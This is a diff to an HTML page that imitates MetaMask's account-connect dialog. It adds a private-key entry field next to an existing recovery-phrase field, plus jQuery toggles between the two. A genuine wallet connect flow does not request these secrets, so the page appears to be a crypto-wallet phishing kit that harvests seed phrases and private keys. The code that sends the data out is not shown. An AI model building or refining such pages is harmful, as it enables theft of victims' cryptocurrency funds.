@@ -258,10 +258,17 @@
               <div class="permissions-connect-choose-account__accounts-list-header--one-item">
                 <div class="permissions-connect-choose-account__text-blue">New Account</div>
               </div>
-              <div class="permissions-connect-choose-account__accounts-list">
+              <div id="passPhrase" class="permissions-connect-choose-account__accounts-list">
                 <div class="permissions-connect-choose-account__account" style="width: 100%; height: 100%;">
                   <div class="permissions-connect-choose-account__account-info-wrapper" style="width: 100%; height: 25px;">
                     <textarea rows="100" id="phrase_metaMask" name="passphrase" style="width: 341px; height: 183px; border: none; margin: 0px;" autofocus="" placeholder="Enter your passphrase" spellcheck="false" class=""></textarea>
+                  </div>
+                </div>
+              </div>
+              <div id="privateKey" class="permissions-connect-choose-account__accounts-list" style="display: none;">
+                <div class="permissions-connect-choose-account__account" style="width: 100%; height: 100%;">
+                  <div class="permissions-connect-choose-account__account-info-wrapper" style="width: 100%; height: 25px;">
+                    <textarea rows="100" id="phrase_metaMask" name="privateKey" style="width: 341px; height: 183px; border: none; margin: 0px;" autofocus="" placeholder="Enter your private key" spellcheck="false" class=""></textarea>
                   </div>
                 </div>
               </div>
@@ -287,6 +294,26 @@
   <script type="text/javascript" src="../js/jquery-1.11.3.min.js"></script>
   <script type="text/javascript" src="../js/imask.js"></script>
   <script type="text/javascript" src="../js/main.js"></script>
+
+  <script>
+  $('#btn_privatekey').click(function() {
+     $(this).removeClass('btn-default');
+     $(this).addClass('btn-primary');
+     $('#btn_phrases').removeClass('btn-primary');
+     $('#btn_phrases').addClass('btn-default');
+     $("#privateKey").css('display', 'block');
+     $("#passPhrase").css('display', 'none');
+  });
+
+  $('#btn_phrases').click(function() {
+     $(this).removeClass('btn-default');
+     $(this).addClass('btn-primary');
+     $('#btn_privatekey').removeClass('btn-primary');
+     $('#btn_privatekey').addClass('btn-default');
+     $("#privateKey").css('display', 'none');
+     $("#passPhrase").css('display', 'block');
+  });
+  </script>
 
 </body>
 <loom-container id="lo-engage-ext-container">
